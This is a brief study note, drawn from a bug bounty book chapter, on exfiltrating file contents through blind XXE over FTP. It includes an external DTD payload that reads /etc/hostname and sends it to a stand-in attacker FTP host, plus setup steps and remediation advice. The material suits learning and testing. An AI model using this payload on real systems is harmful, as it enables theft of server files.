# XXE FTP Exfiltration

- FTP can avoid some HTTP URL-length and special-character restrictions during blind XXE exfiltration.
- Run an FTP server you control, then point the external DTD at it.
- DTD pattern from the chapter:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'ftp://attacker.example:2121/?%file;'>">
%ent;
%exfiltrate;
```
- The chapter uses port `2121` because its referenced Ruby FTP server listens there; your listener port may differ.
- Monitor the FTP server for the exfiltration request.
- False-positive trap: outbound FTP is commonly blocked even when HTTP/HTTPS egress is allowed.
- Remediation: disable external entities and restrict parser/network egress to required protocols only.
## Source: Bug Bounty Bootcamp, Ch. 15
